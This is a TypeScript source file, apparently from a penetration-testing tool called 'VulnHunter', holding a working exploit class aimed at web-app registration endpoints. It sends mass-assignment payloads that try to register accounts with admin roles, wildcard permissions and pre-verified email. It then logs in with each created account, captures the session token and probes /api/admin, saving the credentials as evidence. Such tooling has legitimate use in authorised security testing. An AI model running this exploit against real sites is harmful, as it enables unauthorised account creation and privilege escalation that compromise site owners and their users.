import { BaseExploit, ExploitResult } from './base';

interface ExploitEntry {
  name: string;
  payload: any;
  statusCode: number;
  success: boolean;
  response: any;
  responsePreview: string;
  curlCommand: string;
  loginSuccess?: boolean;
  token?: string;
  adminAccess?: boolean;
}

export class RegistrationExploit extends BaseExploit {
  getPayloads() {
    const payloads = [];
    for (let i = 0; i < 5; i++) {
      const randomStr = Math.random().toString(36).substring(7);
      payloads.push({
        name: `registro_normal_${i}`,
        payload: { email: `test_${randomStr}@vulnhunter.com`, password: 'SenhaForte123!', username: `user_${randomStr}` },
        description: 'Registro normal com dados aleatÃ³rios',
      });
    }
    payloads.push(
      { name: 'registro_com_role_admin', payload: { email: `admin_${Date.now()}@vulnhunter.com`, password: 'Admin123!', role: 'admin', is_admin: true, admin: true }, description: 'Tentativa de registro como admin' },
      { name: 'registro_user_type_admin', payload: { email: `superuser_${Date.now()}@vulnhunter.com`, password: 'Super123!', user_type: 'administrator', type: 'admin' }, description: 'Tentativa com user_type admin' },
      { name: 'registro_com_permissions', payload: { email: `perms_${Date.now()}@vulnhunter.com`, password: 'Perms123!', permissions: ['*', 'all', 'admin'], access_level: 999 }, description: 'Tentativa com permissÃµes explÃ­citas' },
      { name: 'registro_verified_true', payload: { email: `verified_${Date.now()}@vulnhunter.com`, password: 'Verified123!', verified: true, email_verified: true, confirmed: true }, description: 'Tentativa de bypass de verificaÃ§Ã£o' }
    );
    return payloads;
  }

  async execute(): Promise<ExploitResult> {
    this.log(`ðŸŽ¯ Iniciando exploit de registro em ${this.targetUrl}`);
    const endpoint = this.vulnerability.endpoint || '/api/register';
    const fullUrl = `${this.targetUrl}${endpoint}`;
    let successful = 0;
    let failed = 0;

    for (const payloadConfig of this.getPayloads()) {
      try {
        this.log(`ðŸ“¤ Testando: ${payloadConfig.name}`);
        const response = await fetch(fullUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'User-Agent': 'VulnHunter/1.0' },
          body: JSON.stringify(payloadConfig.payload),
        });

        const responseText = await response.text();
        let responseData: any;
        try { responseData = JSON.parse(responseText); } catch { responseData = responseText; }

        const exploitResult: ExploitEntry = {
          name: payloadConfig.name,
          payload: payloadConfig.payload,
          statusCode: response.status,
          success: response.status >= 200 && response.status < 300,
          response: responseData,
          responsePreview: responseText.substring(0, 500),
          curlCommand: this.generateCurlCommand('POST', fullUrl, {
            headers: { 'Content-Type': 'application/json' },
            body: payloadConfig.payload,
          }),
        };

        if (exploitResult.success) {
          successful++;
          this.log(`âœ… SUCESSO! Conta criada: ${payloadConfig.payload.email}`, 'success');
          try {
            const loginResponse = await fetch(`${this.targetUrl}/api/login`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ email: payloadConfig.payload.email, password: payloadConfig.payload.password }),
            });
            if (loginResponse.ok) {
              const loginData = await loginResponse.json();
              exploitResult.loginSuccess = true;
              exploitResult.token = loginData.token;
              this.log(`ðŸ”“ Login bem-sucedido!`, 'success');
              if (payloadConfig.payload.role === 'admin' || payloadConfig.payload.is_admin) {
                const adminResponse = await fetch(`${this.targetUrl}/api/admin`, {
                  headers: { Authorization: `Bearer ${loginData.token}` },
                });
                if (adminResponse.ok) {
                  exploitResult.adminAccess = true;
                  this.log(`ðŸ‘‘ ACESSO ADMIN CONQUISTADO!`, 'success');
                }
              }
            }
          } catch (loginError: any) {
            this.log(`Login falhou: ${loginError.message}`, 'warning');
          }

          this.results.exploits.push(exploitResult);
          this.addEvidence('account_created', {
            email: payloadConfig.payload.email,
            password: payloadConfig.payload.password,
            loginUrl: `${this.targetUrl}/api/login`,
            hasAdminAccess: exploitResult.adminAccess || false,
          });
        } else {
          failed++;
          this.log(`âŒ Falhou: Status ${response.status}`, 'error');
        }
      } catch (error: any) {
        failed++;
        this.log(`âš ï¸ Erro ao testar ${payloadConfig.name}: ${error.message}`, 'error');
      }
      await new Promise(resolve => setTimeout(resolve, 500));
    }

    this.results.success = successful > 0;
    this.results.summary = { totalAttempts: this.getPayloads().length, successful, failed, accountsCreated: successful };
    this.log(`ðŸ“Š Resumo: ${successful} contas criadas de ${this.getPayloads().length} tentativas`);
    return this.finalize();
  }
}
